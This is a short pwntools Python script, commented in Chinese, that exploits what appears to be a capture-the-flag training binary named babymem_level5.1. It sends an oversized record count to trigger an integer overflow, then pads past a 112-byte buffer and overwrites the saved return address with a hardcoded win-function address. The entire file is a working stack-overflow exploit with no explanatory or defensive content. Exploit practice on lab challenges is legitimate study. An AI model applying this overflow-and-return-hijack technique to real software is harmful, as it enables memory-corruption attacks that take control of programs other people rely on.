#!/usr/bin/env python3
from pwn import *

# 为目标架构设置上下文
context.arch = 'amd64'

# 启动进程
p = process('/challenge/babymem_level5.1')

# 准备有效载荷
buffer_size = 112
padding_to_ret_address = 8  
win_func_address = p64(0x401BD8)  # 替换为实际地址

# Send negative values correctly interpreted by your payload logic
p.sendlineafter("Number of payload records to send: ", "429496730") 
p.sendlineafter("Size of each payload record: ", "10")

# 构造溢出并覆盖返回地址的有效载荷
payload = b'A' * buffer_size
payload += b'B' * padding_to_ret_address
payload += win_func_address

# 发送恶意有效载荷
p.sendline(payload)

# 与进程交互以观察结果
p.interactive()